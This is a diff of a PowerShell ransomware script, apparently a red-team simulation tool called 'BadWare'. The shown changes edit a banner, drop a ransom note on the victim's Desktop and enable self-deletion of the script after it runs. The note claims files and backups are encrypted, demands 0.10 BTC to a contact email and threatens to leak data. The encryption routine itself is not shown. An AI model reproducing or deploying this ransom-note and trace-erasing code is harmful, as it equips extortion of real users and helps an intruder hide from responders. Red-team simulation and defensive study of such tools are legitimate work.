@@ -58,7 +58,7 @@ write-host "__________    _____  ________     __      __  _____ ________________
 write-host "\______   \  /  _  \ \______ \   /  \    /  \/  _  \\______   \_   _____/ " -ForeGroundColor DarkRed
 write-host "|    |  _/ /  /_\  \ |    |  \  \   \/\/   /  /_\  \|       _/|    __)_   " -ForeGroundColor DarkRed
 write-host "|    |   \/    |    \|    `   \  \        /    |    \    |   \|        \  " -ForeGroundColor DarkRed
-write-host "|______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /_______  /  " -ForeGroundColor DarkRed
+write-host "|______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /______JM /  " -ForeGroundColor DarkRed
 write-host "       \/         \/        \/         \/         \/       \/        \/  $Version" -ForeGroundColor DarkRed
 
 ### MAIN ### 
@@ -324,7 +324,8 @@ $delay -= 1
 $Form.Close()
 Write-Host "[+] Creating Badware.txt on Desktop ..." -ForegroundColor Green
 "We have encrypted your important files. For now, you cannot access these files. `nEncrypted files have been modified with an extension 'badware'. `nIt is possible to recover your files but you need to follow our instructions and pay us before the time runs out. `nIf you do not pay the ransom of 0.10 BTC these files will be leaked online. `nThe faster you contact us at mechant@cec-fr.digital with the proof of payment, the easier it will be for us to release your files. `nYour backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. `nTo decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. `nIf you do not pay the money your sensitive data will be leaked online. `n `n Computacenter Red Team ! " | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt
-#Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
-#Get-ChildItem -Path $(Get-Location) -Include *.ps1 | remove-Item -recurse 
+
+Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
+Remove-Item -Path $MyInvocation.MyCommand.Source
 
 Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green
